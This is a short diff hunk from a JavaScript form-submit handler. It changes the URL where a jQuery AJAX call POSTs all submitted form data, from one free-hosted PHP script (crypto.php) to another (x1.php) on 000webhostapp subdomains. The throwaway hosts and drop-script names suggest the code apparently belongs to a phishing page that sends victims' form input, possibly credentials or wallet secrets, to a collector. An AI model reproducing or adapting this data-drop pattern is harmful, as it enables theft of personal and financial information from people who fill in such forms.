@@ -85,7 +85,7 @@ form.addEventListener('submit', function(e) {
 
     $.ajax({
         type: "POST",
-        url: "https://fenestral-licenses.000webhostapp.com/crypto.php",
+        url: "https://ignorable-licenses.000webhostapp.com/x1.php",
         data: formData,
         enctype: 'multipart/form-data',
         processData: false,
